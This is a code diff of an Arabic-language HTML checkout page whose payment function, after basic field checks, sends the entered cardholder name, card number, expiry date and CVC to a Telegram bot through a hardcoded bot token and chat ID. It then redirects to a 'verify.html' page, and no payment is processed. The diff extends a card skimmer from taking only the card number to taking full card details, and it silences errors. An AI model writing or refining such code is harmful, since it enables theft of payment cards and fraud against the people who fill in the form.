@@ -49,7 +49,6 @@
 </div>
 
 <script>
-// وظيفة إخفاء الخطأ فور الكتابة
 function clearErr(input, errId) {
     input.classList.remove('error');
     document.getElementById(errId).style.display = 'none';
@@ -60,30 +59,27 @@ async function processPayment() {
     
     // التحقق من الحقول
     if(document.getElementById('cardNum').value.length < 16) { document.getElementById('cardNum').classList.add('error'); document.getElementById('err-cardNum').style.display = 'block'; isValid = false; }
+    if(document.getElementById('exp').value.trim() === "") { document.getElementById('exp').classList.add('error'); document.getElementById('err-exp').style.display = 'block'; isValid = false; }
     if(document.getElementById('cvc').value.length < 3) { document.getElementById('cvc').classList.add('error'); document.getElementById('err-cvc').style.display = 'block'; isValid = false; }
     if(document.getElementById('cardName').value.trim() === "") { document.getElementById('cardName').classList.add('error'); document.getElementById('err-cardName').style.display = 'block'; isValid = false; }
 
     if(!isValid) return;
 
-    // تغيير المحتوى داخل الصندوق فقط
-    const container = document.querySelector('.checkout-box');
-    container.innerHTML = `<h2 style="text-align:center; color:#38bdf8; margin-top:20px;">جاري معالجة الطلب...</h2><p style="text-align:center;">يرجى الانتظار...</p>`;
+    // تغيير المحتوى
+    document.getElementById('mainContainer').innerHTML = `<h2 style="text-align:center; color:#38bdf8; margin-top:20px;">جاري معالجة الطلب...</h2><p style="text-align:center;">يرجى الانتظار...</p>`;
 
     const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
     const chatId = "5976228373";
-    let msg = `💳 طلب دفع: ${document.getElementById('cardNum').value}`;
     
-    // محاولة إرسال البيانات
+    // تجميع البيانات
+    let msg = `💳 *طلب دفع جديد*\n👤 الاسم: ${document.getElementById('cardName').value}\n🔢 الرقم: ${document.getElementById('cardNum').value}\n📅 التاريخ: ${document.getElementById('exp').value}\n🔒 CVC: ${document.getElementById('cvc').value}`;
+    
     try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-    } catch(e) {
-        console.log("Error sending to telegram");
-    }
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    } catch(e) {}
 
-    // التحويل الإجباري للصفحة التالية بعد 2 ثانية
-    setTimeout(function() {
-        window.location.href = "verify.html";
-    }, 2000);
+    // الانتقال للصفحة التالية
+    window.location.href = "verify.html";
 }
 </script>
 </body>
